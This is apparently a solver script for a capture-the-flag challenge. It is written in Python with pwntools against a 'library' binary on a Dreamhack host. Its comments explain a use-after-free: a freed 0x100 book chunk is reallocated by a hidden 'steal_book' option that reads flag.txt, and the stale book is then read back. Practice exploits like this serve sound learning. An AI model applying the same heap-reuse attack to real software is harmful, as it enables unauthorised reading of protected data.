#!/usr/bin/python3

from pwn import *
"""
This is a problem that exploits the UAF vulnerability. It was difficult to find this because 
it was so good at memset that I thought it was preventing UAF, but there was only one part 
that it didn't do. You can read it using this part.    
"""

"""
The fopen function in steal_book is a function that reads a file. What file should be read..? Of course it is flag.txt!!!!! 

I thought borrowing from borrow_book was stealing a book... but that's not true at all. In borrow_book, allocating on the 

heap with malloc and receiving a file with fopen function in steal_book has nothing to do with it. It's file input and output.

Anyway, if you trigger uaf, free it, and then malloc it (to a size similar to the memory you just freed), you can solve the 

problem by taking advantage of the property that it will be located in almost the same memory.

There is a book that allocates a size of 0x100, so borrow the book, return it, use steal_book to steal!! flag.txt, and read the book.

I solved it without using pwntools.
"""
context.binary = exe = ELF('./library', checksec=False)
context.log_level = 'debug'
def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('host3.dreamhack.games',16863 )
else:
        p = process(exe.path)

# GDB()

# flag = b'/home/pwnlibrary/flag.txt'
flag = b'flag.txt'

def borrow(idx):
        sla(b'menu : ',b'1')
        sla(b'borrow? : ',str(idx))

def read(idx):
        sla(b'menu : ',b'2')
        sla(b'read? : ',str(idx))

def ret():
        sla(b'menu : ',b'3')

def steel(size):
        sla(b'menu : ',str(0x113))
        sla(b'book? : ',flag)
        sla(b'(MAX 400) : ',str(size))

borrow(1)
ret()
steel(0x100)
read(0)

p.interactive()